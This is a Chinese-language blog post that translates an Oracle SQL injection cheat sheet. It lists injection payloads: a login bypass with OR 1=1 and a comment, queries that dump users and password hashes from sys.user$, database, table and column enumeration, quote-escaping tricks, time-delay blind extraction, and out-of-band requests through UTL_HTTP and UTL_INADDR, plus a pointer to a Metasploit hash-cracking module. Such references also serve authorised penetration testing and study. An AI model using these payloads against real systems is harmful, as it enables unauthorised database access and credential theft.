---
title: SQLi Oracle 基础知识
date: 2018-03-22 15:54:24
tags:
		- SQLi
		- 翻译
		 
categories:
		- 翻译
---

翻译：SQL注入之Oracle篇。

<!-- more -->



#### [Oracle](https://websec.ca/kb/sql_injection#Oracle_Default_Databases)

#### 默认数据库

	SYSTEM	Available in all versions 所有版本
	SYSAUX	Available in all versions 所有版本


#### 注释

以下的语句可以注释掉注入语句的其余部分

	--	SQL comment

__例子__

	SELECT * FROM Users WHERE username = '' OR 1=1 --' AND password = '';


#### 版本

	SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
	SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
	SELECT version FROM v$instance;

__注意__

- `Oracle`所有的`select`语句必须包含一个表
- `dual`是一个虚拟的表可以被用来测试(下面的翻译可能要好)
- `dual`是一个可用于测试的虚拟表

#### 数据库凭证

	SELECT username FROM all_users;	Available on all versions
	SELECT name, password from sys.user$;	Privileged, <= 10g
	SELECT name, spare4 from sys.user$;	Privileged, <= 11g

#### 数据库名字

##### 当前数据库

	SELECT name FROM v$database;
	SELECT instance_name FROM v$instance
	SELECT global_name FROM global_name
	SELECT SYS.DATABASE_NAME FROM DUAL

##### 用户数据库

	SELECT DISTINCT owner FROM all_tables;


#### 服务器主机名字

	SELECT host_name FROM v$instance; (Privileged)
	SELECT UTL_INADDR.get_host_name FROM dual;
	SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;
	SELECT UTL_INADDR.get_host_address FROM dual;

#### 表和列

__获取表__

	SELECT table_name FROM all_tables;

__获取列__

	SELECT column_name FROM all_tab_columns;

__从列名中查找表__

	SELECT column_name FROM all_tab_columns WHERE table_name = 'Users';

__从表名中查找列__

	SELECT table_name FROM all_tab_tables WHERE column_name = 'password';

__一次获取多张表__

	SELECT RTRIM(XMLAGG(XMLELEMENT(e, table_name || ',')).EXTRACT('//text()').EXTRACT('//text()') ,',') FROM all_tables;

#### 逃逸引号

不像其他关系型数据库，`Oracle`允许表/列名字编码

	SELECT 0x09120911091 FROM dual;	Hex Encoding.
	SELECT CHR(32)||CHR(92)||CHR(93) FROM dual;	CHR() Function.


#### 字符串连接

	SELECT 'a'||'d'||'mi'||'n' FROM dual;

#### 条件语句

	SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END FROM dual

#### 时间

__延迟__

	SELECT UTL_INADDR.get_host_address('non-existant-domain.com') FROM dual;

__严重时间延迟__

	AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) > 0 AND 300 > ASCII(SUBSTR((SELECT username FROM all_users WHERE rownum = 1),1,1));

#### 权限

	SELECT privilege FROM session_privs;
	SELECT grantee, granted_role FROM dba_role_privs; (Privileged)

#### 带外通道

__DNS 请求__

	SELECT UTL_HTTP.REQUEST('http://localhost') FROM dual;
	SELECT UTL_INADDR.get_host_address('localhost.com') FROM dual;

#### 密码破解

一个`Metasploit`模块[`JTR`](https://www.rapid7.com/db/modules/auxiliary/analyze/jtr_oracle_fast)

